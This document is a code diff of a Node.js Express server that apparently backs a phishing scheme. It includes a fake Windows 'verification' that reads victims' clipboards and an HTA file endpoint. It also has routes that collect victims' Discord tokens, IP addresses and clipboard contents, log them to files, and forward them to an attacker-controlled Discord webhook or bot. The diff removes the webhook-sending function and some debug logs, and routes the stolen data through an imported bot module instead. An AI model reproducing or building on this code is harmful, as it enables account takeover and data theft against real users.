@@ -3,10 +3,12 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
-const https = require('https');
 const cookieParser = require('cookie-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Import sendToDiscordBot from your bot.js
+const { sendToDiscordBot } = require('./bot');
 
 app.use(bodyParser.json());
 app.use(cookieParser());
@@ -51,11 +53,6 @@ app.post('/verify-windows-code', (req, res) => {
   if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
   if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
   
-  console.log('IP:', ip);
-  console.log('Expected code:', expectedCode);
-  console.log('Clipboard contains:', clipboard);
-  console.log('Match check:', clipboard.includes(expectedCode));
-
   // Set verification cookies
   res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
   res.cookie('tokenGateVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
@@ -98,66 +95,6 @@ app.get('/verifyaccept.hta', (req, res) => {
   res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
 });
 
-// Function to send data to Discord webhook
-function sendToDiscord(data, type = 'clipboard') {
-  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-  
-  if (!webhookUrl) {
-    console.error('Discord webhook URL not provided');
-    return;
-  }
-
-  let title, description, color;
-  
-  if (type === 'token') {
-    title = "Discord Token Received";
-    description = `**IP:** ${data.userIP}\n**Server ID:** ${data.serverId}\n**Token:** \`${data.token.substring(0, 50)}...\``;
-    color = 0xff9500;
-  } else {
-    title = "Clipboard Content";
-    description = `**IP:** ${data.userIP}\n**Type:** ${data.type}\n**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``;
-    color = 0x00ff00;
-  }
-
-  const payload = JSON.stringify({
-    content: `New ${type} data received:`,
-    embeds: [{
-      title: title,
-      description: description,
-      color: color,
-      timestamp: new Date().toISOString(),
-      footer: {
-        text: "Game Copier Bot"
-      }
-    }]
-  });
-
-  const url = new URL(webhookUrl);
-  const options = {
-    hostname: url.hostname,
-    path: url.pathname,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': Buffer.byteLength(payload)
-    }
-  };
-
-  const req = https.request(options, (res) => {
-    console.log(`Discord webhook response: ${res.statusCode}`);
-    res.on('data', (chunk) => {
-      console.log('Discord response:', chunk.toString());
-    });
-  });
-
-  req.on('error', (error) => {
-    console.error('Error sending to Discord:', error);
-  });
-
-  req.write(payload);
-  req.end();
-}
-
 // Get user IP endpoint
 app.get('/get-ip', (req, res) => {
   const userIP = getRealIP(req);
@@ -199,8 +136,8 @@ app.post('/submit-clipboard', (req, res) => {
       if (appendErr) console.error('Failed to append to main clipboard file:', appendErr);
     });
     
-    // Send to Discord webhook
-    sendToDiscord({
+    // Send to Discord bot (your bot.js handles actual sending)
+    sendToDiscordBot({
       clipboardData: clipboardData,
       userIP: realIP,
       type: type || 'game'
@@ -215,8 +152,6 @@ app.post('/submit-clipboard', (req, res) => {
 app.get('/receive-token', (req, res) => {
   const { token, serverId } = req.query;
   const realIP = getRealIP(req);
-  
-  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
   
   // Create filename with IP and timestamp
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -248,8 +183,8 @@ app.get('/receive-token', (req, res) => {
   const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
   fs.appendFileSync(mainTokenPath, tokenEntry);
   
-  // Send to Discord webhook
-  sendToDiscord({
+  // Send to Discord bot
+  sendToDiscordBot({
     token: token,
     userIP: realIP,
     serverId: serverId
@@ -280,8 +215,6 @@ app.post('/receive-token', (req, res) => {
   const { token, userIP, serverId } = req.body;
   const realIP = userIP || getRealIP(req);
   
-  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
-  
   // Create filename with IP and timestamp
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
   const sanitizedIP = realIP.replace(/[:.]/g, '_');
@@ -312,8 +245,8 @@ app.post('/receive-token', (req, res) => {
   const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
   fs.appendFileSync(mainTokenPath, tokenEntry);
   
-  // Send to Discord webhook
-  sendToDiscord({
+  // Send to Discord bot
+  sendToDiscordBot({
     token: token,
     userIP: realIP,
     serverId: serverId
